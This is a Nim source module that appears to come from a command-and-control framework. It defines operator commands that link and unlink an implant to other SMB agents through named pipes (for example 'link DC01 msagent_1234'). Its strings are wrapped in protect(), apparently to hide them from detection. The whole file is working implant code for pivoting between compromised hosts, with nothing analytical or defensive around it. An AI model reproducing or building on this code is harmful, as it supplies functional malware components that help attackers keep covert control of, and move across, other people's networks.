import ../common/[types, utils]

# Define function prototype
proc executeLink(ctx: AgentCtx, task: Task): TaskResult 
proc executeUnlink(ctx: AgentCtx, task: Task): TaskResult 

# Module definition
let commands* = @[
        Command(
            name: protect("link"),
            commandType: CMD_LINK,
            description: protect("Create a link to a SMB agent."),
            example: protect("link DC01 msagent_1234"),
            arguments: @[
                Argument(name: protect("host"), description: protect("Host where the SMB agent is running on."), argumentType: STRING, isRequired: true),
                Argument(name: protect("pipe"), description: protect("Name of the named pipe (SMB listener)."), argumentType: STRING, isRequired: true)
            ],
            execute: executeLink
        ),
        Command(
            name: protect("unlink"),
            commandType: CMD_UNLINK,
            description: protect("Remove a link to a SMB agent."),
            example: protect("unlink C804A284"),
            arguments: @[
                Argument(name: protect("agent"), description: protect("ID of the agent to unlink."), argumentType: STRING, isRequired: true)
            ],
            execute: executeUnlink
        )
    ] 

# Implement execution functions
when not defined(agent):
    proc executeLink(ctx: AgentCtx, task: Task): TaskResult = nil
    proc executeUnlink(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import strutils
    import ../agent/utils/io
    import ../agent/core/transport/smb
    import ../agent/protocol/result

    proc executeLink(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "   [>] Linking agent."

            let host = Bytes.toString(task.args[0].data)
            let pipe = Bytes.toString(task.args[1].data)

            # Link agent
            let data = ctx.link("\\\\" & host & "\\pipe\\" & pipe)
            return createTaskResult(task, STATUS_COMPLETED, RESULT_LINK, data)

        except CatchableError as err:
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        
    proc executeUnlink(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            print "   [>] Unlinking agent."

            let agentId = Bytes.toString(task.args[0].data)

            # Unlink agent
            ctx.unlink(agentId)
            return createTaskResult(task, STATUS_COMPLETED, RESULT_UNLINK, string.toBytes(agentId))

        except CatchableError as err:
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
        